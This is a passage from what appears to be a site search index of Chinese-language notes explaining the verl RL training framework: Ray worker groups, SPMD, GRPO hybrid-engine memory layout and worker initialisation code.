<p></p> <p>\u5728\u8bad\u7ec3\u7684\u8fc7\u7a0b\u4e2d\u9996\u5148\u8981\u786e\u5b9a\u5404\u4e2aModel\u653e\u5728\u54ea\u4e9b\u673a\u5668\u4e0a\uff0c\u7136\u540e\u6839\u636e\u4e0d\u540c\u903b\u8f91\u9636\u6bb5\u6765\u8fdb\u884c\u76f8\u5e94\u7684\u6267\u884c</p> <p>Verl\u8fd9\u7c7b\u6846\u67b6\u7684\u76ee\u6807\u5c31\u662f\u5728\u7528\u6237\u5b9a\u4e49\u4e86DataFlow\u4e4b\u540e\uff0c\u5176\u53ef\u4ee5\u5e2e\u52a9\u5b8c\u6210\u5e95\u5c42\u7684\u8d44\u6e90\u5206\u914d\u4ee5\u53ca\u9ad8\u6548\u7684\u8c03\u5ea6\uff0c\u63d0\u9ad8\u5e76\u53d1</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl/#1-verl-code-walkthrough","title":"1. Verl Code Walkthrough","text":"<p>\u9996\u5148\u662f\u8fdb\u5165main\u51fd\u6570\u4e2d\u7684TaskRunner.run\u662f\u6574\u4e2averl\u7684\u5165\u53e3</p> <p>\u7b2c\u4e00\u6b65\u5176\u5b9e\u662f\u8d44\u6e90\u7684\u5206\u914d\uff0c\u4f1a\u5148\u521d\u59cb\u5316\u8d44\u6e90\u6c60\u5b50\uff0c\u7136\u540e\u89c4\u5b9a\u597d\u54ea\u51e0\u5757\u673a\u5668\u662f\u505a\u4ec0\u4e48\u7528\u9014\u3002Verl\u4e2d\u9ed8\u8ba4\u7684\u5b9e\u73b0\u662f\u6bcf\u4e2aworkload\u90fd\u4f7f\u7528\u5168\u5c40\u7684\u8d44\u6e90\u6c60\u5b50\uff0c\u4e5f\u5373\u6bcf\u4e2aWorkload\u5360\u636e\u5168\u90e8GPU\uff0c\u5bfc\u81f4\u4e86\u6bcf\u4e2aworkload\u7684\u8fc7\u7a0b\u5176\u5b9e\u90fd\u662f\u4e32\u884c\u7684</p> <p>\u7b2c\u4e8c\u6b65\u662fTrainer\u7684\u521d\u59cb\u5316\uff0c\u521d\u59cb\u5316Ray\u91cc\u9762\u7684worker</p> <p></p> <p>\u6211\u4eec\u4f1a\u628a\u4e0d\u540c\u7684workload\u7eb3\u5165\u5230\u540c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\uff08\u5b9a\u4e49workerGroup\uff09\uff0c\u51cf\u5c11\u5185\u5b58\u7684\u788e\u7247\uff08GPU\u4e0a\u7684\u8fdb\u7a0b\u5176\u5b9e\u90fd\u5728\u72ec\u81ea\u7ef4\u62a4memory pool\uff0c\u56e0\u6b64\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u6709\u6ca1\u7528\u5230\u7684\u4f46\u662f\u5360\u7528\u7684\u5185\u5b58\uff0c\u8fdb\u7a0b\u8d8a\u591a\u8fd9\u7c7b\u788e\u7247\u5c31\u8d8a\u591a\uff09</p> <p>\u7b2c\u4e09\u6b65\uff0c\u8bad\u7ec3\u7684\u5faa\u73af</p> <p></p> <p>\u91c7\u7528Single Controller\u8fd9\u4e2a\u8303\u5f0f\u6765\u6700\u5927\u5316\u7075\u6d3b\u6027\uff0c\u5728\u5e38\u89c4\u6d41\u7a0b\u4e2d\uff0c\u5927\u5bb6\u90fd\u4f7f\u7528\u5168\u5c40\u8d44\u6e90\u6c60\u5b50\u7684\u4e32\u884c\u6761\u4ef6\u4e0b\uff0c\u6838\u5fc3\u7684PPO\u8bad\u7ec3\u4ee3\u7801\u5c31\u4e0a\u9762\u8fd9\u51e0\u884c</p> <ul> <li>\u8fc7\u4e00\u4e2aepoch</li> <li>\u5728epoch\u4e2d\u8fed\u4ee3data batch</li> <li>Generating</li> <li>Preparing Experiences</li> <li>Training</li> </ul> <p>\u5185\u90e8\u5176\u5b9e\u6d89\u53ca\u4e86\u5f88\u591a\u901a\u4fe1\u7684\u5185\u5bb9\uff0c\u867d\u7136\u901a\u4fe1\u662f\u5f88\u6602\u8d35\u7684\uff0c\u4f46\u662f\u5185\u90e8\u8fd9\u8fb9\u6211\u4eec\u53ea\u7528\u5230\u4e86prompt\u548cresponses\u7684\u901a\u4fe1\uff0c\u76f8\u5bf9\u4e8e\u53c2\u6570\u7684\u901a\u4fe1\u662f\u5f00\u9500\u8f83\u5c0f\u7684</p> <p>\u7b2c\u56db\u6b65\uff0cWorker Procedure\uff0cMulti-Controller</p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u5f00\u59cb\u6d89\u53caWorker\u5185\u90e8\uff0c\u5176\u5185\u90e8\u6211\u4eec\u7528\u5230SPMD\u7b49\u6982\u5ff5\uff0c\u5176\u7f16\u7a0b\u66f4\u590d\u6742\uff0c\u4f46\u662f\u5176\u6548\u7387\u4f1a\u66f4\u9ad8\u3002SPMD\u4e2d\u8fdb\u7a0b\u4ee3\u7801\u662f\u76f8\u540c\u7684\uff0c\u4f46\u662f\u5176\u5904\u7406\u7684\u6570\u636e\u662f\u4e0d\u540c\u7684</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl/#2-spmd-in-verl","title":"2. SPMD in Verl","text":"<p>\u9996\u5148\u4e5f\u662f\u8d44\u6e90\u7ba1\u7406\u7684\u90e8\u5206</p> <p></p> <p>\u4f1a\u5728GPU\u4e0a\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff0c\u5e76\u653e\u7f6e\u4e8eray\u7684worker class\u4e2d</p> <p>\u5176\u6b21\u662f\u5982\u4f55\u5b9a\u4e49SPMD\u884c\u4e3a\uff0c\u4e5f\u5c31\u662f\u5982\u4f55\u628a\u5bf9\u5e94\u7684\u7a0b\u5e8f\u52a0\u8f7d\u5230worker\u4e0a</p> <p></p> <p>register\u7684\u5b9a\u4e49\uff0c\u8fd9\u4f1a\u7ed9\u4fee\u9970\u7684\u51fd\u6570\u6dfb\u52a0\u4e00\u7cfb\u5217\u7684\u5c5e\u6027</p> <p></p> <p></p> <p>\u8fd9\u4e2a\u51fd\u6570\u662f\u6838\u5fc3\u6a21\u677f\uff0c\u5e94\u5bf9\u4e86\u6bcf\u4e2aworker\u91cc\u9762\u5b9e\u9645\u6267\u884c\u7684\u5185\u5bb9\uff0c\u4e4b\u524d\u7684\u4e00\u4e9b\u6a21\u5757\u5728\u8fd9\u91cc\u7ec4\u5408\u6210\u4e00\u4e2a\u771f\u6b63\u7684function</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl/#rollout","title":"Rollout\u7684\u4e00\u81f4\u6027\u95ee\u9898","text":"<p>\u5173\u4e8eTokenizer\u7684\u4e00\u4e9b\u7279\u6027\uff0c\u5728\u5e26\u6709\u548c\u73af\u5883\u4ea4\u4e92\u7684RL\u7684\u8fc7\u7a0b\u4e2d\uff0c\u662f\u9700\u8981\u6709\u4e00\u4e9b\u6ce8\u610f\u4e8b\u9879\u7684\uff0c\u90a3\u5c31\u662f\u5bf9\u4e8e\u4e00\u4e2atokenizer\uff0c\u5176encoder\u518ddecoder\u7684\u7ed3\u679c\u662f\u4e00\u81f4\u7684\uff0c\u4f46\u662fdecoder\u518dencoder\u7684\u7ed3\u679c\u662f\u4e0d\u4e00\u5b9a\u4e00\u81f4\u7684</p> <p>\u5b9e\u9645\u4e0a\u7531\u591a\u4e2atoken_id\u53ef\u4ee5\u88ab\u89e3\u7801\u6210\u540c\u4e00\u4e2a\u6587\u672c\uff0c\u4f46\u662f\u4e00\u4e2a\u6587\u672c\u53ea\u88ab\u7f16\u7801\u6210\u4e00\u4e2atoken_id</p> <p>\u5982\u4e0a\u56fe\uff0c\u8fd9\u4e2a\u6d41\u7a0b\u5982\u679c\u628a\u8f68\u8ff9\u76f4\u63a5encoder\uff0c\u5176\u7ed3\u679c\u662f\u53ef\u80fd\u4e0d\u4e00\u81f4\u7684\uff0c\u56e0\u4e3a\u5176\u5148\u628aresponse\u89e3\u7801\u7684\u7ed3\u679c\u7528\u4f5ctoolcall\uff0c\u540e\u7eed\u5728\u7f16\u7801\u56de\u53bb\uff0c\u53ef\u80fd\u5bfc\u81f4\u9519\u8bef</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/","title":"GRPO_verl: \u5b8c\u6574\u8bad\u7ec3\u6d41\u7a0b\u4e0e\u6a21\u5f0f\u5207\u6362\u673a\u5236","text":"<p>\u672c\u6587\u6863\u8be6\u7ec6\u8bf4\u660e verl \u6846\u67b6\u4e2d GRPO (Group Relative Policy Optimization) \u8bad\u7ec3\u7684\u5b8c\u6574\u6d41\u7a0b\uff0c\u5305\u62ec\u8d44\u6e90\u5206\u914d\u3001\u6570\u636e\u6d41\u5411\u3001\u663e\u5b58\u5360\u7528\u3001FSDP \u4e0e Rollout \u7684\u6a21\u5f0f\u5207\u6362\u673a\u5236\u4ee5\u53ca\u53c2\u6570\u540c\u6b65\u7684\u5177\u4f53\u5b9e\u73b0\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#_1","title":"\u76ee\u5f55","text":"<ol> <li>\u6574\u4f53\u67b6\u6784\uff1aHybrid Engine \u6a21\u5f0f</li> <li>\u8d44\u6e90\u521d\u59cb\u5316\u9636\u6bb5</li> <li>\u6a21\u578b\u52a0\u8f7d\u4e0e\u663e\u5b58\u5360\u7528</li> <li>PPO \u5b8c\u6574\u8bad\u7ec3\u8fed\u4ee3\u6d41\u7a0b</li> <li>\u6a21\u5f0f\u5207\u6362\u7684\u8be6\u7ec6\u673a\u5236</li> <li>\u53c2\u6570\u540c\u6b65\u7684\u5e95\u5c42\u5b9e\u73b0</li> <li>\u663e\u5b58\u7ba1\u7406\u65f6\u95f4\u7ebf</li> <li>\u4ee3\u7801\u4f4d\u7f6e\u7d22\u5f15</li> <li>\u6027\u80fd\u4f18\u5316\u5efa\u8bae</li> </ol>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#1-hybrid-engine","title":"1. \u6574\u4f53\u67b6\u6784\uff1aHybrid Engine \u6a21\u5f0f","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#11-hybrid-engine","title":"1.1 \u4e3a\u4ec0\u4e48\u9700\u8981 Hybrid Engine\uff1f","text":"<p>PPO \u8bad\u7ec3\u9700\u8981\u4e24\u4e2a\u6a21\u578b\uff1a - Actor FSDP \u6a21\u578b\uff1a\u7528\u4e8e\u8bad\u7ec3\uff0c\u9700\u8981\u68af\u5ea6\u8ba1\u7b97\u548c\u53c2\u6570\u66f4\u65b0\uff08\u5206\u7247\u5b58\u50a8\uff09 - Rollout \u6a21\u578b\uff1a\u7528\u4e8e\u63a8\u7406\u751f\u6210\uff0c\u9700\u8981\u9ad8\u6548\u7684 KV Cache \u7ba1\u7406\uff08\u5b8c\u6574\u6a21\u578b\uff09</p> <p>\u5982\u679c\u5206\u522b\u90e8\u7f72\uff0c\u9700\u8981 2\u500d\u7684 GPU \u8d44\u6e90\u3002Hybrid Engine \u5c06\u4e24\u8005\u5171\u7f6e\uff08colocation\uff09\u5728\u540c\u4e00\u7ec4 GPU \u4e0a\uff0c\u8282\u7701 50% \u8d44\u6e90\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#12-hybrid-engine","title":"1.2 Hybrid Engine \u67b6\u6784","text":"<pre><code>\u6bcf\u4e2a GPU \u4e0a\u7684\u6a21\u578b\u5e03\u5c40\uff08\u4ee5 Qwen3-8B \u4e3a\u4f8b\uff09:\n\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 GPU 0 (80GB)                                                \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Actor FSDP \u6a21\u578b\uff08\u8bad\u7ec3\u7528\uff09                                   \u2502\n\u2502   \u251c\u2500\u2500 \u53c2\u6570\u5206\u7247 [0:1B]: 2GB (\u53ef offload \u5230 CPU)             \u2502\n\u2502   \u251c\u2500\u2500 \u4f18\u5316\u5668\u72b6\u6001 (AdamW): 4GB (\u53ef offload \u5230 CPU)          \u2502\n\u2502   \u2514\u2500\u2500 \u68af\u5ea6\u7f13\u51b2: 2GB                                         \u2502\n\u2502                                                             \u2502\n\u2502 Rollout \u6a21\u578b\uff08\u63a8\u7406\u7528\uff0cvLLM/SGLang\uff09                         \u2502\n\u2502   \u251c\u2500\u2500 \u5b8c\u6574\u53c2\u6570 [0:8B]: 16GB (\u56fa\u5b9a\u5728 GPU)                   \u2502\n\u2502   \u2514\u2500\u2500 KV Cache: 32GB (\u52a8\u6001\u5206\u914d/\u91ca\u653e)                        \u2502\n\u2502                                                             \u2502\n\u2502 \u603b\u663e\u5b58\u5360\u7528: 18-62GB (\u53d6\u51b3\u4e8e\u5f53\u524d\u6a21\u5f0f)                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#13","title":"1.3 \u4e24\u79cd\u8fd0\u884c\u6a21\u5f0f","text":"\u6a21\u5f0f Actor FSDP Rollout \u6a21\u578b Rollout KV Cache \u5178\u578b\u663e\u5b58 Trainer Mode \u5728 GPU (2-8GB) \u5728 GPU (16GB) \u5df2\u91ca\u653e (0GB) ~22GB Rollout Mode \u53ef offload (0-2GB) \u5728 GPU (16GB) \u5df2\u5206\u914d (32GB) ~50GB <p>\u6838\u5fc3\u601d\u60f3\uff1a\u901a\u8fc7\u52a8\u6001\u5207\u6362\u6a21\u5f0f\uff0c\u590d\u7528\u663e\u5b58\u7a7a\u95f4\u3002</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#2","title":"2. \u8d44\u6e90\u521d\u59cb\u5316\u9636\u6bb5","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#21-ray-actors","title":"2.1 \u521b\u5efa\u8d44\u6e90\u6c60\u548c Ray Actors","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a - <code>verl/trainer/main_ppo.py:166-189</code> - \u521b\u5efa\u8d44\u6e90\u6c60 - <code>verl/trainer/ppo/ray_trainer.py:661-796</code> - \u521d\u59cb\u5316 workers</p> <pre><code># ========== \u6b65\u9aa4 1: \u521b\u5efa\u8d44\u6e90\u6c60 ==========\n# \u6587\u4ef6: verl/trainer/main_ppo.py:166-189\nresource_pool = RayResourcePool(\n    process_on_nodes=[8],  # 8 \u4e2a\u8fdb\u7a0b\uff08\u6bcf\u4e2a GPU \u4e00\u4e2a\uff09\n    use_gpu=True,\n)\n\n# \u521b\u5efa Placement Groups\uff08GPU \u8d44\u6e90\u5206\u914d\uff09\npgs = resource_pool.get_placement_groups()\n# \u7ed3\u679c: 8 \u4e2a Placement Groups\uff0c\u6bcf\u4e2a\u5305\u542b 1 \u4e2a GPU bundle\n\n\n# ========== \u6b65\u9aa4 2: \u5b9a\u4e49\u5171\u7f6e Worker \u914d\u7f6e ==========\n# \u6587\u4ef6: verl/trainer/ppo/ray_trainer.py:745-766\nclass_dict = {\n    \"actor_rollout\": RayClassWithInitArgs(\n        cls=ray.remote(ActorRolloutRefWorker),\n        args=(...),\n        kwargs={\n            \"config\": actor_config,\n            \"role\": \"actor_rollout\",  # Actor + Rollout \u529f\u80fd\n        }\n    ),\n}\n\n\n# ========== \u6b65\u9aa4 3: \u521b\u5efa\u878d\u5408 Worker \u7c7b\uff08WorkerDict\uff09==========\n# \u6587\u4ef6: verl/single_controller/ray/base.py:749-790\nworker_dict_cls = create_colocated_worker_cls(class_dict)\n\n# WorkerDict \u5185\u90e8\u7ed3\u6784\uff1a\nclass WorkerDict(Worker):\n    def __init__(self):\n        self.worker_dict = {\n            \"actor_rollout\": ActorRolloutRefWorker(role=\"actor_rollout\"),\n        }\n\n    # \u81ea\u52a8\u7ed1\u5b9a\u65b9\u6cd5\uff08\u5e26\u524d\u7f00\uff09\n    def actor_rollout_generate_sequences(self, data):\n        return self.worker_dict[\"actor_rollout\"].generate_sequences(data)\n\n    def actor_rollout_compute_log_prob(self, data):\n        return self.worker_dict[\"actor_rollout\"].compute_log_prob(data)\n\n    def actor_rollout_update_actor(self, data):\n        return self.worker_dict[\"actor_rollout\"].update_actor(data)\n\n\n# ========== \u6b65\u9aa4 4: \u521b\u5efa RayWorkerGroup\uff08\u542f\u52a8 8 \u4e2a Ray Actors\uff09==========\n# \u6587\u4ef6: verl/single_controller/ray/base.py:361-444\nwg_dict = RayWorkerGroup(\n    resource_pool=resource_pool,\n    ray_cls_with_init=worker_dict_cls,\n)\n\n# \u6b64\u65f6\u521b\u5efa\u4e86 8 \u4e2a Ray Actors\uff1a\n# GPU 0: Ray Actor 0 (WorkerDict \u5b9e\u4f8b)\n# GPU 1: Ray Actor 1 (WorkerDict \u5b9e\u4f8b)\n# ...\n# GPU 7: Ray Actor 7 (WorkerDict \u5b9e\u4f8b)\n\n\n# ========== \u6b65\u9aa4 5: Spawn \u521b\u5efa WorkerGroup \u89c6\u56fe ==========\n# \u6587\u4ef6: verl/single_controller/ray/base.py:478-512\nspawn_wg = wg_dict.spawn(prefix_set={\"actor_rollout\"})\n\n# spawn_wg = {\n#     \"actor_rollout\": RayWorkerGroup(\n#         _workers=[Actor 0, ..., Actor 7],  # \u5171\u4eab\u76f8\u540c\u7684 8 \u4e2a Ray Actors\n#         \u65b9\u6cd5: generate_sequences, compute_log_prob, update_actor  # \u53bb\u6389\u524d\u7f00\n#     )\n# }\n\n\n# ========== \u6b65\u9aa4 6: \u63d0\u53d6\u6700\u7ec8\u7684 WorkerGroup ==========\n# \u6587\u4ef6: verl/trainer/ppo/ray_trainer.py:763\nself.actor_rollout_wg = spawn_wg[\"actor_rollout\"]\n</code></pre>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#22-spawn","title":"2.2 Spawn \u673a\u5236\u8be6\u89e3","text":"<p>Spawn \u7684\u6838\u5fc3\u4f5c\u7528\uff1a\u5b9e\u73b0\u5171\u7f6e\uff08Colocation\uff09</p> <pre><code># \u7269\u7406\u7ed3\u6784\uff088 \u4e2a Ray Actors\uff09\uff1a\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 GPU 0: Ray Actor 0 (WorkerDict)                             \u2502\n\u2502   \u251c\u2500\u2500 worker_dict[\"actor_rollout\"] = ActorRolloutRefWorker \u2502\n\u2502   \u2514\u2500\u2500 worker_dict[\"ref\"] = RefWorker (\u5982\u679c\u914d\u7f6e\u4e86)           \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 GPU 1: Ray Actor 1 (WorkerDict)                             \u2502\n\u2502   \u251c\u2500\u2500 worker_dict[\"actor_rollout\"] = ActorRolloutRefWorker \u2502\n\u2502   \u2514\u2500\u2500 worker_dict[\"ref\"] = RefWorker                        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 ... (GPU 2-6)                                               \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 GPU 7: Ray Actor 7 (WorkerDict)                             \u2502\n\u2502   \u251c\u2500\u2500 worker_dict[\"actor_rollout\"] = ActorRolloutRefWorker \u2502\n\u2502   \u2514\u2500\u2500 worker_dict[\"ref\"] = RefWorker                        \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n# \u903b\u8f91\u7ed3\u6784\uff083 \u4e2a RayWorkerGroup \u5bf9\u8c61\uff09\uff1a\n\nwg_dict (\u539f\u59cb)\n\u251c\u2500\u2500 _workers = [Actor 0, Actor 1, ..., Actor 7]\n\u251c\u2500\u2500 \u65b9\u6cd5: actor_rollout_generate_sequences, ref_compute_ref_log_prob\n\u2514\u2500\u2500 \u7528\u9014: \u521d\u59cb\u5316\uff0c\u901a\u5e38\u4e0d\u76f4\u63a5\u4f7f\u7528\n\nspawn_wg[\"actor_rollout\"] (\u89c6\u56fe1)\n\u251c\u2500\u2500 _workers = [Actor 0, Actor 1, ..., Actor 7]  # \u5171\u4eab\u76f8\u540c\u7684 Actors\uff01\n\u251c\u2500\u2500 \u65b9\u6cd5: generate_sequences, update_actor  # \u53ea\u66b4\u9732 actor_rollout \u7684\u65b9\u6cd5\n\u2514\u2500\u2500 \u8c03\u7528\u65f6\u8def\u7531\u5230 worker_dict[\"actor_rollout\"]\n\nspawn_wg[\"ref\"] (\u89c6\u56fe2, \u5982\u679c\u6709)\n\u251c\u2500\u2500 _workers = [Actor 0, Actor 1, ..., Actor 7]  # \u5171\u4eab\u76f8\u540c\u7684 Actors\uff01\n\u251c\u2500\u2500 \u65b9\u6cd5: compute_ref_log_prob  # \u53ea\u66b4\u9732 ref \u7684\u65b9\u6cd5\n\u2514\u2500\u2500 \u8c03\u7528\u65f6\u8def\u7531\u5230 worker_dict[\"ref\"]\n</code></pre> <p>\u5173\u952e\u70b9\uff1a - \u7269\u7406\u4e0a\u53ea\u6709 8 \u4e2a Ray Actors\uff088 \u4e2a\u8fdb\u7a0b\uff09 - \u903b\u8f91\u4e0a\u6709\u591a\u4e2a RayWorkerGroup \u5bf9\u8c61\uff08\u89c6\u56fe\uff09 - \u6240\u6709\u89c6\u56fe\u90fd\u5f15\u7528\u76f8\u540c\u7684 8 \u4e2a Ray Actors - Spawn \u53ea\u662f\u521b\u5efa\u4e86\u4e0d\u540c\u7684\"\u89c6\u56fe\"\uff0c\u4e0d\u521b\u5efa\u65b0\u7684 Ray Actors - \u76ee\u7684\uff1a\u907f\u514d\u4e3a\u6bcf\u4e2a\u529f\u80fd\u521b\u5efa\u72ec\u7acb\u7684 GPU \u8fdb\u7a0b\uff0c\u8282\u7701\u8d44\u6e90</p>"},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#3","title":"3. \u6a21\u578b\u52a0\u8f7d\u4e0e\u663e\u5b58\u5360\u7528","text":""},{"location":"%E5%9B%BD%E5%86%85%E5%A4%96%E8%91%97%E5%90%8D%E8%AF%BE%E7%A8%8B/AI/ML_System/Verl_GRPO/#31-__init__-worker","title":"3.1 <code>__init__</code> - Worker \u521d\u59cb\u5316","text":"<p>\u4ee3\u7801\u4f4d\u7f6e\uff1a<code>verl/workers/fsdp_workers.py:139-263</code></p> <p>\u5728 Ray Actor \u521b\u5efa\u65f6\uff0c\u9996\u5148\u8c03\u7528 <code>ActorRolloutRefWorker.__init__()</code>\uff1a</p> <pre><code># \u6587\u4ef6: verl/workers/fsdp_workers.py:139-263\n\nclass ActorRolloutRefWorker(Worker, DistProfilerExtension):\n    def __init__(self, config: DictConfig, role: str, **kwargs):\n        Worker.__init__(self)\n        self.config = config\n\n        # ========== \u6b65\u9aa4 1: \u521d\u59cb\u5316\u5206\u5e03\u5f0f\u73af\u5883 ==========\n        import torch.distributed\n\n        if not torch.distributed.is_initialized():\n            rank = int(os.environ.get(\"RANK\", 0))\n            world_size = int(os.environ.get(\"WORLD_SIZE\", 1))\n            torch.distributed.init_process_group(\n                backend=f\"cpu:gloo,{get_device_name()}:{get_nccl_backend()}\",\n                rank=rank,\n                world_size=world_size,\n            )\n\n        self.rank = torch.distributed.get_rank()\n        self.world_size = torch.distributed.get_world_size()\n        self.local_rank = int(os.environ.get(\"LOCAL_RANK\", 0))\n\n        # ========== \u6b65\u9aa4 2: \u521b\u5efa Device Mesh\uff08\u5206\u5e03\u5f0f\u62d3\u6251\uff09==========\n        from torch.distributed.device_mesh import init_device_mesh\n\n        # Device Mesh \u7528\u4e8e FSDP/TP \u5206\u7247\n        # \u4f8b\u5982\uff1a8 \u4e2a GPU \u2192 DeviceMesh([0, 1, 2, 3, 4, 5, 6, 7])\n        self.device_mesh = init_device_mesh(\n            get_device_name(),\n            mesh_shape=(self.world_size,),\n            mesh_dim_names=(\"fsdp\",)\n        )\n\n        # ========== \u6b65\u9aa4 3: \u89e3\u6790 role\uff08\u51b3\u5b9a\u521b\u5efa\u54ea\u4e9b\u6a21\u578b\uff09==========\n        # role \u53ef\u80fd\u7684\u503c\uff1a\n        # - \"actor_rollout\": \u521b\u5efa Actor FSDP + Rollout \u6a21\u578b\uff08Hybrid Engine\uff09\n        # - \"actor\": \u4ec5\u521b\u5efa Actor FSDP\n        # - \"rollout\": \u4ec5\u521b\u5efa Rollout \u6a21\u578b\n        # - \"ref\": \u521b\u5efa Reference \u6a21\u578b\n\n        self._is_actor = \"actor\" in role  # \u662f\u5426\u5305\u542b Actor \u529f\u80fd\n        self._is_rollout = \"rollout\" in role  # \u662f\u5426\u5305\u542b Rollout \u529f\u80fd\n        self._is_ref = \"ref\" in role  # \u662f\u5426\u5305\u542b Reference \u529f\u80fd\n\n        # ========== \u6b65\u9aa4 4: \u914d\u7f6e Offload \u7b56\u7565 ==========\n        self._is_offload_param = config.actor.model.get(\"enable_parameter_offload\", False)\n        self._is_offload_optimizer = config.actor.optimizer.get(\"enable_optimizer_offload\", False)\n\n        # \u6ce8\u610f\uff1a__init__ \u9636\u6bb5\u53ea\u662f\u914d\u7f6e\uff0c\u4e0d\u52a0\u8f7d\u6a21\u578b\uff01\n        # 